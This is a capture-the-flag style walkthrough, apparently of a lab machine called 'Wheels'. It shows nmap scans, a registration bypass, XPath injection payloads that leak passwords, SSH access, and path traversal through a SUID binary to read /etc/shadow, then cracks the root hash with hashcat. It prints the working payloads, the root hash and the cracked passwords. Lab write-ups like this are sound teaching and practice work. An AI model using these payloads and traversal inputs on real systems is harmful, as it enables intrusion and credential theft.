First start enumeration using nmap

`nmap -p- --min-rate 10000 -oN fulltcp.txt -v -Pn <IP>`

```
# Nmap 7.93 scan initiated Fri Dec 30 09:06:46 2022 as: nmap -p- --min-rate 10000 -oN fulltcp.txt -v -Pn 192.168.108.202
Increasing send delay for 192.168.108.202 from 0 to 5 due to 18 out of 59 dropped probes since last increase.
Increasing send delay for 192.168.108.202 from 5 to 10 due to 60 out of 198 dropped probes since last increase.
Increasing send delay for 192.168.108.202 from 80 to 160 due to 49 out of 162 dropped probes since last increase.
Increasing send delay for 192.168.108.202 from 160 to 320 due to 11 out of 28 dropped probes since last increase.
Increasing send delay for 192.168.108.202 from 640 to 1000 due to 13 out of 41 dropped probes since last increase.
Warning: 192.168.108.202 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.108.202
Host is up (0.19s latency).
Not shown: 37958 closed tcp ports (conn-refused), 27575 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
# Nmap done at Fri Dec 30 09:08:14 2022 -- 1 IP address (1 host up) scanned in 88.18 seconds
```

now know what ports are open, run nmap default scripts to know what services are running on those ports.

`nmap -sC -sV -oN normal.tcp -p 22,80 -Pn  <IP>`

```
# Nmap 7.93 scan initiated Fri Dec 30 09:08:56 2022 as: nmap -sC -sV -oN normal.tcp -p 22,80 -Pn 192.168.108.202
Nmap scan report for 192.168.108.202
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1994b952225ed0f8520d363b448bbcf (RSA)
|   256 0f448badad95b8226af036ac19d00ef3 (ECDSA)
|_  256 32e12a6ccc7ce63e23f4808d33ce9b3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Wheels - Car Repair Services
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Dec 30 09:09:17 2022 -- 1 IP address (1 host up) scanned in 20.96 seconds
```


now know what service is running, let's start enumeration with port 80 (http)

![image](https://user-images.githubusercontent.com/87468669/211496830-63ca27b2-bdf9-4e36-b46a-be768d1a14f0.png)

We discover a webserver running on port 80. After opening it in a browser, we are directed to a homepage for a car service entitled `Wheels Car Service`

![image](https://user-images.githubusercontent.com/87468669/211497683-28b5e6a5-7b4f-40a5-bb5d-d2dfe6cd598d.png)

We register with `nighth@hacker.com` and `12345` as the password and login. We are unable to access `portal.php`, and receive an `Access Denied` message. However, during our initial enumeration of the `portal.php` page, we saw a footer with the contact e-mail as `info@wheels.service`. Since there is no e-mail verification when registering, we can try registering with `nighthawk@wheels.service` as the email. 

![image](https://user-images.githubusercontent.com/87468669/211497790-3ce9b893-aea0-41b6-8298-6256f7bedc83.png)

After logging in with `nighthawk@wheels.service`, we are able to successfully login and access the Employee portal. The `portal.php` page has an option to filter users by services, specifically `car & bike`. After clicking on each filter, we see two sets of what appear to be usernames.

![image](https://user-images.githubusercontent.com/87468669/211497915-98492ae1-812d-4ad4-8288-cde8ff85a39d.png)

bike filter... now let's intercept requests with burpsuite.

![image](https://user-images.githubusercontent.com/87468669/211498281-2b77c5d5-76c5-42a2-aa2d-dcc3fe2bd960.png)

intercepted requests using burpsuite, replace the `bike` filter with `test`, we got an XML error: `test entity not found`. this looks like a potential  xpath injection. let's test for xpath injection.

###### XPATH Injection
The previous error leads us to believe an XPATH Injection is a viable attack worth testing.

When passing `')] | //user/*[contains(*,'` in the `work` parameter (found from [PayloadAllThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XPATH%20Injection/README.md)), the response displays 6 empty Boxes.

Let's attempt to fuzz this parameter with the following payload:

```
%27)%5D/password%20%7C%20a%5Bcontains(a,%27
```

We insert the payload into the `work` parameter

![image](https://user-images.githubusercontent.com/87468669/211497111-634a5a9d-ad21-4602-9c43-a3dae81a3bb4.png)

This reveals a list of passwords that do not have any usernames associated with them.

```
Iamrockinginmyroom1212
iamarabbitholeand7875
johnloveseverontr8932
lokieismyfav!@#12
alreadydead$%^234
lasagama90809!@
```

Now we have some passwords, and usernames, let's try ssh using those creds.
The first Password in the list was `Iamrockinginmyroom1212` and the first name, when enabling the `car` filter, is `bob`. This may indicate this user has this password. We can SSH into user `bob` with password `Iamrockinginmyroom1212` and gain a low privilege shell.

![image](https://user-images.githubusercontent.com/87468669/211497196-80e62bc7-a407-42e3-8d5a-979f8cc7af86.png)

Bull's eye we are in. let's escalate privs.

```
bob@wheels:/opt$ ls -al
total 28
drwxr-xr-x  2 root root  4096 May 11  2022 .
drwxr-xr-x 20 root root  4096 Jan  7  2021 ..
-rwsr-sr-x  1 root root 16808 May 11  2022 get-list
bob@wheels:/opt$ ./get-list 


Which List do you want to open? [customers/employees]: customers
Opening File....

Michael
Christopher
Jessica
Matthew
Ashley
Jennifer
Joshua
Amanda
Daniel
David
James
Robert
John
Joseph

bob@wheels:/opt$ 
```

In the `/opt` directory, found an suid binary `get-list` owned by root. running the binary asks us what file to open. as we can see a
When the program asks us which list we want to open, it only accepts the specified amount as an input, making a buffer overflow a non-viable attack.

Next, it checks if any of the following characters are present: `;` `&` `|`.
If they are present, the program immediately terminates.
If they are not present, the program checks if either `customers` or `employees` options are present.
If neither are present, the programs prints `Oops something went wrong!!` and exits the program.
If those options are present, the program prints `Opening File....` and proceeds to `cat` out the `/root/details/%s`.
With this logic in mind, we can attempt to open the **/etc/passwd/** file with the following input:

```
bob@wheels:/opt$  ./get-list
Which List do you want to open? [customers/employees]: ../../etc/passwd #employees
Opening File....
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
bob:x:1000:1000::/home/bob:/bin/sh
mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false
```

We have successfully viewed the **/etc/passwd** file. We can follow the same process to view **/etc/shadow**.

```
bob@wheels:/opt$  ./get-list
Which List do you want to open? [customers/employees]: ../../etc/shadow #employees
Opening File....
root:$6$jgsanIAwx1.w9V/.$cOWVUY1EiX.hbXPY//o8vDug9rIqLuzjs6KPzz6V8RM/4nK.Z1UXacdZW2Lj2J6yK/lZRC2uLbZ/bdEtWhbJu0:19066:0:99999:7:::
mysql:!:19066:0:99999:7:::
```

Now that we can view the root user's hash, we can attempt to crack it with `hashcat`.

```
root:$6$jgsanIAwx1.w9V/.$cOWVUY1EiX.hbXPY//o8vDug9rIqLuzjs6KPzz6V8RM/4nK.Z1UXacdZW2Lj2J6yK/lZRC2uLbZ/bdEtWhbJu0:19066:0:99999:7:::
```

First, we copy the hash to a file.

```
echo "$6$jgsanIAwx1.w9V/.$cOWVUY1EiX.hbXPY//o8vDug9rIqLuzjs6KPzz6V8RM/4nK.Z1UXacdZW2Lj2J6yK/lZRC2uLbZ/bdEtWhbJu0." > hash
```

```
hashcat -m 1800 -a 0 hash $rockyou --force -o cracked
...
$6$jgsanIAwx1.w9V/.$cOWVUY1EiX.hbXPY//o8vDug9rIqLuzjs6KPzz6V8RM/4nK.Z1UXacdZW2Lj2J6yK/lZRC2uLbZ/bdEtWhbJu0.:highschoolmusical
```

The password is `highschoolmusical`. We can `SSH` in as the root user.

![image](https://user-images.githubusercontent.com/87468669/211500917-32dbfcb0-3b4f-461a-9df0-f2bed0e3b0e6.png)

Boom!!! we are root.🤠🤠
